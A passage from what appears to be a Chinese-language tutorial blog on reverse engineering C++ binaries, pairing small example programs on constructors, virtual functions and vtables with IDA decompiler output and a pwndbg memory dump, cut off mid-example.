<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string&gt;</span>  </span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test1</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Test1</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test2</span> :</span> <span class="keyword">public</span> Test1&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">Test2</span>();</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">Test1::<span class="built_in">Test1</span>(<span class="keyword">void</span>)&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Test1&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Test2::<span class="built_in">Test2</span>(<span class="keyword">void</span>)&#123;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Test2&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">	Test2 t;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>IDA 分析：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Test2 t; <span class="comment">// [rsp+17h] [rbp-9h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  Test2::<span class="built_in">Test2</span>(&amp;t);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于在 Test2 的构造函数中没有调用父类 Test1 的构造函数，因此编译器会自动加上 Test2 的构造函数：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">Test2::Test2</span><span class="params">(Test2 *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  Test1::<span class="built_in">Test1</span>(<span class="keyword">this</span>);</span><br><span class="line">  v1 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;std::cout, <span class="string">&quot;Test2&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v1, &amp;std::endl&lt;<span class="keyword">char</span>,std::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>案例四：带有一个虚函数的类</p>
<ul>
<li>源代码：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Test::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    Test *t = <span class="keyword">new</span> <span class="built_in">Test</span>();</span><br><span class="line">    t-&gt;<span class="built_in">foo</span>();   </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>IDA 分析：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Test *v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = (Test *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  v3-&gt;_vptr_Test = <span class="number">0LL</span>;</span><br><span class="line">  Test::<span class="built_in">Test</span>(v3);</span><br><span class="line">  (*v3-&gt;_vptr_Test)(v3, argv);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>由于 Test 中有虚函数，因此编译器会自动为其生成构造函数：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">Test::Test</span><span class="params">(Test *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">this</span>-&gt;_vptr_Test = (<span class="built_in"><span class="keyword">int</span></span> (**)(...))&amp;off_3D70;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="虚函数"><a href="#虚函数" class="headerlink" title="虚函数"></a>虚函数</h2><p>面向对象的语言有三大特性：继承、封装、多态，虚函数就是 cpp 实现多态的方式</p>
<ul>
<li>多态：指用相同的接口去表示不同的实现</li>
</ul>
<p>案例一：使用虚函数实现多态</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>:</span><span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;A::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span>:</span><span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;B::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span>:</span><span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">foo</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;C::foo() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    Base *a = <span class="keyword">new</span> <span class="built_in">B</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo</span>(); <span class="comment">// B::foo() is called</span></span><br><span class="line">    ((A *)a)-&gt;<span class="built_in">foo</span>(); <span class="comment">// B::foo() is called</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>当使用类的指针调用成员函数时：<ul>
<li>普通函数由指针类型决定</li>
<li>虚函数由指针指向的实际类型决定</li>
</ul>
</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  B *v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = (B *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  v3-&gt;_vptr_Base = <span class="number">0LL</span>;</span><br><span class="line">  B::<span class="built_in">B</span>(v3);</span><br><span class="line">  (*v3-&gt;_vptr_Base)(v3, argv);</span><br><span class="line">  (*v3-&gt;_vptr_Base)(v3);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 <code>_vptr_Base</code> 就是虚指针基址，它将会在对应的构造函数中进行初始化</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __cdecl <span class="title">B::B</span><span class="params">(B *<span class="keyword">const</span> <span class="keyword">this</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Base::Base(<span class="keyword">this</span>);</span><br><span class="line">  <span class="keyword">this</span>-&gt;_vptr_Base = (<span class="keyword">int</span> (**)(...))&amp;off_3D40;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D40 <span class="number">8</span>C <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_3D40 dq offset _ZN1B3fooEv          ; DATA XREF: B::B(<span class="keyword">void</span>)+<span class="number">18</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D40                                                                       ; B::foo(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>
<p>对于拥有虚函数的类，其每个对象均具有一个指向本类虚函数表的指针 <code>_vptr_Base</code>（可以将其理解为虚函数的函数指针）</p>
<p>案例二：虚函数的调用与虚表</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo1() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo2() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo3() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo4</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo4() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo5</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo5() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    Base *a = <span class="keyword">new</span> <span class="built_in">Base</span>();</span><br><span class="line">    a-&gt;<span class="built_in">foo1</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foo2</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foo3</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foo4</span>();  </span><br><span class="line">    a-&gt;<span class="built_in">foo5</span>();  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>cpp 底层处理虚表的方式就是强转并调用 <code>_vptr_Base + offset</code>：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  Base *v3; <span class="comment">// rbx</span></span><br><span class="line">  Base *a; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (Base *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  v3-&gt;_vptr_Base = <span class="number">0LL</span>;</span><br><span class="line">  Base::<span class="built_in">Base</span>(v3);</span><br><span class="line">  a = v3;</span><br><span class="line">  (*v3-&gt;_vptr_Base)(v3, argv);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(Base *))a-&gt;_vptr_Base + <span class="number">1</span>))(a);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(Base *))a-&gt;_vptr_Base + <span class="number">2</span>))(a);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(Base *))a-&gt;_vptr_Base + <span class="number">3</span>))(a);</span><br><span class="line">  (*((<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(Base *))a-&gt;_vptr_Base + <span class="number">4</span>))(a);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>再看一个去符号的：</li>
</ul>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _QWORD *v3; <span class="comment">// rbx</span></span><br><span class="line">  _QWORD *v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v3 = (_QWORD *)<span class="keyword">operator</span> <span class="built_in"><span class="keyword">new</span></span>(<span class="number">8uLL</span>);</span><br><span class="line">  *v3 = <span class="number">0LL</span>;</span><br><span class="line">  <span class="built_in">sub_13B4</span>(v3, a2);</span><br><span class="line">  v5 = v3;</span><br><span class="line">  (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(_QWORD *))*v3)(v3);</span><br><span class="line">  (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(_QWORD *))(*v5 + <span class="number">8LL</span>))(v5);</span><br><span class="line">  (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(_QWORD *))(*v5 + <span class="number">16LL</span>))(v5);</span><br><span class="line">  (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(_QWORD *))(*v5 + <span class="number">24LL</span>))(v5);</span><br><span class="line">  (*(<span class="built_in"><span class="keyword">void</span></span> (__fastcall **)(_QWORD *))(*v5 + <span class="number">32LL</span>))(v5);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>查看虚表，里面装有各个虚函数的首地址：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D50 <span class="number">9</span>C <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       off_3D50 dq offset _ZN4Base4foo1Ev      ; DATA XREF: Base::Base(<span class="keyword">void</span>)+<span class="number">8</span>↑o</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D50                                                                       ; Base::foo1(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D58 D4 <span class="number">12</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo2Ev               ; Base::foo2(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D60 <span class="number">0</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo3Ev               ; Base::foo3(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D68 <span class="number">44</span> <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo4Ev               ; Base::foo4(<span class="keyword">void</span>)</span><br><span class="line">.data.rel.ro:<span class="number">0000000000003</span>D70 <span class="number">7</span>C <span class="number">13</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span>       dq offset _ZN4Base4foo5Ev               ; Base::foo5(<span class="keyword">void</span>)</span><br></pre></td></tr></table></figure>
<ul>
<li>用 GDB 进行调试：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55883ca88000</span>+<span class="number">0x3D50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdx <span class="number">0x55883ca8bd50</span> —▸ <span class="number">0x55883ca8929c</span> (Base::foo1()) ◂— push   rbp</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x55883ca8bd58</span> —▸ <span class="number">0x55883ca892d4</span> (Base::foo2()) ◂— push   rbp</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0x55883ca8bd60</span> —▸ <span class="number">0x55883ca8930c</span> (Base::foo3()) ◂— push   rbp</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x55883ca8bd68</span> —▸ <span class="number">0x55883ca89344</span> (Base::foo4()) ◂— push   rbp</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x55883ca8bd70</span> —▸ <span class="number">0x55883ca8937c</span> (Base::foo5()) ◂— push   rbp</span><br></pre></td></tr></table></figure>
<p>案例三：虚函数的继承</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Base</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo1</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo1() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo2</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo2() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foo3</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::foo3() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> :</span> <span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fooa</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::fooa() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foob</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::fooa() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> :</span> <span class="keyword">public</span> Base&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">fooa</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::fooa() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">virtual</span> <span class="keyword">void</span> <span class="title">foob</span><span class="params">()</span></span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;Base::fooa() is called&quot;</span>&lt;&lt;endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    A *a = <span class="keyword">new</span> <span class="built_in">A</span>();</span><br><span class="line">    B *b = <span class="keyword">new</span> <span 